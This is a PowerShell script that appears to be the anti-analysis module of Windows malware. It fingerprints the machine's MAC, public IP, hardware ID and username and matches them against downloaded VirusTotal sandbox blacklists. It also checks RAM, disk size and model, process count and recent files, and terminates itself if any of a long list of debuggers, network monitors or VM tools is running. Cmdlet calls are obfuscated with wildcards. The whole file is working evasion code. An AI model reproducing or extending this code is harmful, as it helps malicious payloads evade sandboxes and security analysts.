Add-Type -AssemblyName System.Windows.Forms

function ShowError {
    param([string]$errorName)
    [System.Windows.Forms.MessageBox]::Show("VM/VPS/SANDBOXES ARE NOT ALLOWED ! $errorName", '', 'OK', 'Error') | Out-Null
}

function Search-Mac {
    $pc_mac = &(gcm gwm*) win32_networkadapterconfiguration | Where-Object { $_.IpEnabled -Match "True" } | Select-Object -ExpandProperty macaddress
    $pc_macs = $pc_mac -join ","
    return $pc_macs
}

function Search-IP {
    $pc_ip = &(gcm I*e-Web*t*) -Uri "https://api.ipify.org" -UseB
    $pc_ip = $pc_ip.Content
    return $pc_ip
}

function InternetCheck {
    try {
        $result = Test-Connection -ComputerName google.com -Count 1 -ErrorAction Stop
        Write-Host "[!] Internet connection is active." -ForegroundColor Green
    }
    catch {
    ([Windows.Forms.MessageBox]::Show('INTERNET CONNECTION CHECK FAILED!', 'Error', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error))
        Stop-Process $pid -Force
    }
}


function ProcessCountCheck {
    $processes = gps | Measure-Object | Select-Object -ExpandProperty Count
    if ($processes -lt 50) {
        [System.Windows.Forms.MessageBox]::Show('PROCESS COUNT CHECK FAILED !', '', 'OK', 'Error')
        Stop-Process $pid -Force
    }
}

function RecentFileActivity {
    $file_Dir = "$ENV:APPDATA/microsoft/windows/recent"
    $file = Get-ChildItem -Path $file_Dir -Recurse
    #if number of files is less than 20
    if ($file.Count -lt 20) {
        [System.Windows.Forms.MessageBox]::Show('RECENT FILE ACTIVITY CHECK FAILED !', '', 'OK', 'Error')
        Stop-Process $pid -Force
    }
}

function TestDriveSize {
    $drives = Get-Volume | Where-Object { $_.DriveLetter -ne $null } | Select-Object -ExpandProperty DriveLetter
    $driveSize = 0
    foreach ($drive in $drives) {
        $driveSize += (Get-Volume -DriveLetter $drive).Size
    }
    $driveSize = $driveSize / 1GB
    if ($driveSize -lt 50) {
        [Windows.Forms.MessageBox]::Show('DRIVE SIZE CHECK FAILED !', '', 'OK', 'Error')
        Stop-Process $pid -Force
    }

}

function Search-HWID {
    $hwid = &(gcm gwm*) -Class Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID
    return $hwid
}

function Search-Username {
    $getuser = [Security.Principal.WindowsIdentity]::GetCurrent().Name
    $username = $getuser.Split("\")[1]
    return $username
}

function Invoke-ANTITOTAL {
    $anti_functions = @(
        "InternetCheck",
        "ProcessCountCheck",
        "RecentFileActivity",
        "TestDriveSize"
    )

    #foreach ($func in $anti_functions) {
    #    Invoke-Expression "$func"
    #}
    $urls = @(
        "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/mac_list.txt",
        "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/ip_list.txt",
        "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/hwid_list.txt",
        "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_username_list.txt"
    )

    $functions = @(
        "Search-Mac",
        "Search-IP",
        "Search-HWID",
        "Search-Username"
    )

    $data = @()
    foreach ($func in $functions) {
        $data += Invoke-Expression "$func"
    }
    foreach ($url in $urls) {
        $blacklist = &(gcm I*e-Web*t*) -Uri $url -UseBasicParsing | Select-Object -ExpandProperty Content -ErrorAction SilentlyContinue
        if ($null -ne $blacklist) {
            foreach ($item in $blacklist -split "`n") {
                if ($data -contains $item) {
                    ShowError $item
                    Stop-Process $pid -Force
                }
            }
        }
    }
}

function ram_check {
    $ram = (&(gcm gwm*) -Class Win32_PhysicalMemory | Measure-Object -Property capacity -Sum).Sum / 1GB
    if ($ram -lt 6) {
        ([System.Windows.Forms.MessageBox]::Show('RAM CHECK FAILED !', '', 'OK', 'Error'))
        Stop-Process $pid -Force
    }
}


function VMPROTECT {
    if (Test-Path "$env:localappdata\Temp\JSAMSIProvider64.dll") { Stop-Process $pid -Force }
    ram_check           
    #triage detection
    $d = wmic diskdrive get model
    if ($d -like "*DADY HARDDISK*" -or $d -like "*QEMU HARDDISK*") {
        ShowError "QEMU HARDDISK"
        Stop-Process $pid -Force
    }    
    $processNames = @(
        "32dbg",
        "64dbgx",
        "autoruns",
        "autoruns64",
        "autorunsc",
        "autorunsc64",
        "ciscodump",
        "df5serv",
        "die",
        "dumpcap",
        "efsdump",
        "etwdump",
        "fakenet",
        "fiddler",
        "filemon",
        "hookexplorer",
        "httpdebugger",
        "httpdebuggerui",
        "ida",
        "ida64",
        "idag",
        "idag64",
        "idaq",
        "idaq64",
        "idau",
        "idau64",
        "idaw",
        "immunitydebugger",
        "importrec",
        "joeboxcontrol",
        "joeboxserver",
        "ksdumperclient",
        "lordpe",
        "ollydbg",
        "pestudio",
        "petools",
        "portmon",
        "prl_cc",
        "prl_tools",
        "proc_analyzer",
        "processhacker",
        "procexp",
        "procexp64",
        "procmon",
        "procmon64",
        "qemu-ga",
        "qga",
        "regmon",
        "reshacker",
        "resourcehacker",
        "sandman",
        "sbiesvc",
        "scylla",
        "scylla_x64",
        "scylla_x86",
        "sniff_hit",
        "sysanalyzer",
        "sysinspector",
        "sysmon",
        "tcpdump",
        "tcpview",
        "tcpview64",
        "udpdump",
        "vboxcontrol",
        "vboxservice",
        "vboxtray",
        "vgauthservice",
        "vm3dservice",
        "vmacthlp",
        "vmsrvc",
        "vmtoolsd",
        "vmusrvc",
        "vmwaretray",
        "vmwareuser",
        "vt-windows-event-stream",
        "windbg",
        "wireshark",
        "x32dbg",
        "x64dbg",
        "x96dbg",
        "xenservice"
    )
    $foundProcesses = gps | Where-Object { $processNames -contains $_.Name.ToLower() } | Select-Object -ExpandProperty Name
    if ($null -ne $foundProcesses) {
        Write-Host "[!] Found the following processes:" -ForegroundColor Red
        $foundProcesses -join "`n" | Write-Host
        ShowError $foundProcesses
        Stop-Process $pid -Force
    }  
    if ($null -eq $foundProcesses) {
        Invoke-ANTITOTAL
    }
}
VMPROTECT

